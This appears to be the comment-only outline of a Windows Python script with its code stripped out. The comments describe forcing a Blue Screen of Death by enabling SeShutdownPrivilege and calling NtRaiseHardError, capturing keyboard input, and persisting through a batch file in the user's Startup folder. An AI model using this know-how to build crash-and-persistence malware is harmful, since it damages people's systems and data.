# Importing necessary libraries
# Used to retrieve the current user's username
# Provides functions to interact with the operating system
# Allows capturing and simulating keyboard events
# Provides C-compatible data types and allows calling functions in DLLs or shared libraries
# Used to spawn new processes and interact with the system shell
# Windows-specific types used in ctypes functions


# Function to trigger a Blue Screen of Death (BSOD)

# Run a command to access a non-existent or invalid file path (this might be system-specific)
# Use ctypes to adjust system privileges to allow raising a critical error
# Privilege 19 refers to "SeShutdownPrivilege" which is required to shut down the system
# This raises a critical system error using Windows' NtRaiseHardError, which causes a BSOD
# The error code 0xc0000022 generally indicates an access denied error
# NtRaiseHardError triggers the shutdown type 6 (forcing the system to crash)

# Function to ensure the script runs at startup
  # Get the username of the currently logged-in user
    # Define the path to the user's Startup folder, where programs can be set to run on startup
    # Make this path global so that other functions (like uninstall) can access it
    # Create a batch file in the Startup folder to automatically run the current script on startup
     # The batch file will contain a command to start this script when the system boots up
     
# Function to uninstall (clean up) the startup process
  # Destroy the window (in Tkinter or any GUI used in the main program)
  # Remove the batch file created in the startup folder to stop the script from running at startup
